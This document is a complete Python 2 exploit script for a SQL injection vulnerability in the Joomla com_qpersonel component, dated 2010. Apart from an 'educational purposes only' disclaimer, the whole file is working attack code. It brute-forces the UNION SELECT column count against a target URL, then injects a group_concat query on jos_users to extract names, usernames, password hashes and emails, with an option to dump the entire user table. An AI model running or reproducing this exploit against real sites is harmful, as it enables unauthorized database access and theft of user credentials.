#!/usr/bin/python

# Joomla com_qpersonel SQL Injection Remote Exploit
# Version 1.0 (23th May 2010 (public release)
# By Valentin Hoebel (valentin@xenuser.org)
# ASCII FOR BREAKFAST
#
# EXPLOIT BASED ON MY COLUMN FUZZER
# Fuzzer was enhanced so it serves as a Joomla Exploiter template
#
# About the Vulnerability:
# ------------------------------------------------------------------------
# http://www.xenuser.org/documents/security/qpersonel_sql.txt
#
# About the Exploit:
# ------------------------------------------------------------------------
# Exploits the SQL injection vulnerability I discovered
# on 13th April 2010.
#
# Copy, modify, distribute and share the code as you like!
# Warning: I am not responsible for any damage you might cause!
# Exploit written for educational purposes only.

import sys,  re,  urllib,  urllib2,  string
from urllib2 import Request, urlopen, URLError, HTTPError

# Define the max. amounts for trying
max_columns = 100

# Prints usage
def print_usage():
    print ""
    print "================================================================================="
    print " Joomla com_qpersonel SQL Injection Remote Exploit"
    print " by Valentin Hoebel (valentin@xenuser.org)"
    print ""
    print " Vulnerable URL example:"
    print " http://target/index.php?option=com_qpersonel&task=qpListele&katid=1"
    print ""
    print " Usage:"
    print "         -u <URL> (e.g. -u \"http://target/index.php?option=com_qpersonel&task=qpListele&katid=1\")"
    print "         --help   (displays this text)"
    print ""
    print " Read the source code if you want to know more about this vulnerability."
    print " For educational purposes only! I am not responsible if you cause any damage!"
    print ""
    print "================================================================================="
    print ""
    print ""
    return

#Prints banner
def print_banner():
    print ""
    print "================================================================================="
    print ""
    print " Joomla com_qpersonel SQL Injection Remote Exploit"
    print " by Valentin Hoebel (valentin@xenuser.org)"
    print ""
    print " For educational purposes only! I am not responsible if you cause any damage!"
    print ""
    print "================================================================================="
    print ""
    return

# Testing if URL is reachable, with error handling
def test_url():
    print ">> Checking if connection can be established..."
    try:
        response = urllib2.urlopen(provided_url)

    except HTTPError,  e:
        print ">> The connection could not be established."
        print ">> Error code: ",  e.code
        print ">> Exiting now!"
        print ""
        sys.exit(1)
    except URLError,  e:
        print ">> The connection could not be established."
        print ">> Reason: ",  e.reason
        print ">> Exiting now!"
        print ""
        sys.exit(1)
    else:
        valid_target = 1
        print ">> Connected to target! URL seems to be valid."
        print ""
    return

# Find correct amount of columns for the SQL Injection and enhance with Joomla exploitation capabilities
def find_columns():
    # Define some important variables and make the script a little bit dynamic
    number_of_columns = 1
    column_finder_url_string = "+AND+1=2+UNION+SELECT+"
    column_finder_url_message = "0x503077337220743020743368206330777321"
    column_finder_url_message_plain = "P0w3r t0 t3h c0ws!"
    column_finder_url_terminator = "+from+jos_users--"
    next_column = ","
    column_finder_url_sample = "group_concat(0x503077337220743020743368206330777321,name,username,password,email,usertype,0x503077337220743020743368206330777321)"

    # Craft the final URL to check
    final_check_url = provided_url+column_finder_url_string+column_finder_url_message
    print ">> Trying to find the correct number of columns..."

    for x in xrange(1, max_columns):
        # Visit website and store response source code of site
        final_check_url2 = final_check_url+column_finder_url_terminator
        response = urllib2.urlopen(final_check_url2)
        html = response.read()
        find_our_injected_string = re.findall(column_finder_url_message_plain, html)

        # When the correct amount was found we display the information and exit
        if len(find_our_injected_string) != 0:
            print ">> Correct number of columns found!"
            print ">> Amount: ",  number_of_columns

            # Craft our exploit query
            malicious_query =  string.replace(final_check_url2, column_finder_url_message, column_finder_url_sample)
            print ""
            print ">> Trying to fetch the first user of the Joomla user table..."

            # Receive the first user of the Joomla user table
            response = urllib2.urlopen(malicious_query)
            html = response.read()
            get_secret_data = string.find(html,  "P0w3r t0 t3h c0ws!")
            get_secret_data += 18
            new_html = html[get_secret_data :]
            new_get_secret_data = string.find(new_html,  "P0w3r t0 t3h c0ws!")
            new_html_2 = new_html[:new_get_secret_data]
            print "name, username, password, e-mail address and user status are shown"
            print new_html_2
            print ""

            # Offer to display all entries of the Joomla user table
            user_reply = str(raw_input(">> Do you want to display all Joomla users? Replying with Yes will show you the source code response of the website. (Yes/No) "))
            if user_reply == "Y" or user_reply == "y" or user_reply == "Yes" or user_reply == "yes":
                print ""
                print "-------------------------------------------------------------"
                print new_html
                print "-------------------------------------------------------------"
                print "The seperator for the single entries is: ",  column_finder_url_message_plain
                print "Bye!"
                print ""
                print ""
                sys.exit(1)
            else:
                print "Bye!"
                print ""
                print ""
                sys.exit(1)

        # Increment counter var by one
        number_of_columns  += 1

        #Add a new column to the URL
        final_check_url += next_column
        final_check_url += column_finder_url_message

    # If fuzzing is not successfull print this message
    print ">> Fuzzing was not successfull. Maybe the target is not vulnerable?"
    print "Bye!"
    print ""
    print ""


# Checking if argument was provided
if len(sys.argv) <=1:
    print_usage()
    sys.exit(1)

for arg in sys.argv:
    # Checking if help was called
    if arg == "--help":
        print_usage()
        sys.exit(1)

    # Checking if  URL was provided, if yes -> go!
    if arg == "-u":
        provided_url = sys.argv[2]
        print_banner()

        # At first we test if we can actually reach the provided URL
        test_url()

        # Now start with finding the correct amount of columns
        find_columns()

### EOF ###